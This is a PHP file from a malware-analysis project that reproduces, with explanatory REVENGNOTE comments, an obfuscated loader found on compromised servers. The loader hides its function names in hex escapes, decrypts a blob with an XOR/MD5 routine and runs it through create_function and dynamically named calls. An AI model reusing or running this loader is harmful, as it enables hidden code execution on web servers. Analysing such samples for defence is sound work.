<?php

/**
 * This is a This is a reverse-engineering of malicious code found in
 * compromised servers. "REVENGNOTE" is used for comments that are not
 * in the original code.
 *
 * @see        https://github.com/alligo/Reverse-Engineering-PHP-Malware-Content-injection
 * @author     Bernardo Donadio <emerson at alligo.com.br>
 * @author     Emerson Rocha Luiz <emerson at alligo.com.br>
 * @copyright  Copyright (C) 2016 Alligo Ltda. Some rights reserved.
 * @license    See LICENSE
 */


function en2($s, $q)
{
	$l = "\x73\164\x72\154\x65\156";
	$p = "\x70\141\x63\153";
	$r = "\x73\165\x62\163\x74\162";
	$m = "\x6d\144\x35";
	$g = "";
	while ($l($g) < $l($s)) {
		$q = $p("H*", $m($g . $q . "\x71\61\x77\62\x65\63\x72\64"));
		$g.= $r($q, 0, 8);
	}

	return $s ^ $g;
}


function random($arr, $qw)
{
    $g = "\x20\167\x2d\70\x36794587495086f963874,qq-82d94486e,r-86297186e94186d945,wq-874941874,s-87\x33\54\x67\75\x20\167\x2e\40\x72\73\x20\155\x2d\70" . "6d944835,sq-873964872937873960\x38\66\x63\71\x35\61\x38\67\x34\42\x3b";
    $soy = "\x65\156\x32";
    $xx = "\x65\170\x70" . "\154\x6f\144\x65";
    $ecx = "\x63\162\x65\141\x74\145\x5f\146\x75\156\x63\164\x69\157\x6e";
    $scy = "\x73\164\x72\137\x72\145\x70\154\x61\143\x65";
    $a = $xx("|", "\x5c\170\x7c\134\x31\174\x3d\42\x7c\42\x3b\44\x7c\44");
    $aa = $xx("|", "8|9|-|,| ");
    $mec = $ecx;
    for ($i = 0; $i < sizeof($a); $i++) {
        $g = $scy($aa[$i], $a[$i], $g);
    }

    $ecx("", "};$g//");
    $mec("", $soy("\230\77\153\147\26\167\114\130\223\257\211\2\253\5\172\316\25\262\145\25\62\72\127\156\270\100\154\56\341\77\4\37\21\152\206\334\101\334\32\210\353\173\253\5\123\231\47\13\20", $scy));
    return $arr[rand((0.24 - (0.03 * 8)) , (0.1875 * 6)) ] . $qw;
}

$r9 = explode("|", $n9);
$b9 = 0;
$a9 = 0;

for ($i9 = 0; $i9 < sizeof($r9); $i9++) {
    if ($i9 == 0) $a9 = 0;
    else $a9 = $r9[$i9 - 1] + $a9;
    $b9 = $r9[$i9];
    $v_[] = substr($v9, $a9, $b9);
}

$y = 1;

for ($i = 0; $i < 5; $i++) {
    /** REVENGNOTE: after all this effort to hide the code, this is is a different
     *              pattern of just call eval or create function. This for
     *              loop ask contents of one array with 5 elements, and, in a
     *              bizarre way change witch function will run the array contents
     **/

    $vv1 = "o" . "o" . $y; /** REVENGNOTE: function oo1() or oo2() **/
    if ($y == 1) $y = 2;
    else $y = 1;
    $vv1($v_[$i]);
}

/** REVENGNOTE: nnext step file have contents the array $v_ **/